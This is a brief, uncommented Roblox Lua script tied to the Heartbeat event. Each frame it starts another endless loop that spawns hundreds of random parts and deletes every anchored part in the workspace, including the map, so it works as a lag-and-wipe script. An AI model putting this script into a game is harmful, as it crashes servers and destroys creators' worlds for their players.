local a = game:GetService("RunService")
local b = game:GetService("Workspace")

local function c()
	while true do
		for i = 1, 100 do
			local d = Instance.new("Part")
			d.Size = Vector3.new(1, 1, 1)
			d.Position = Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))
			d.Anchored = true
			d.Parent = b
		end

		task.wait(0.1)

		for _, d in pairs(b:GetChildren()) do
			if d:IsA("Part") and d.Anchored then
				d:Destroy()
			end
		end
	end
end

a.Heartbeat:Connect(c)
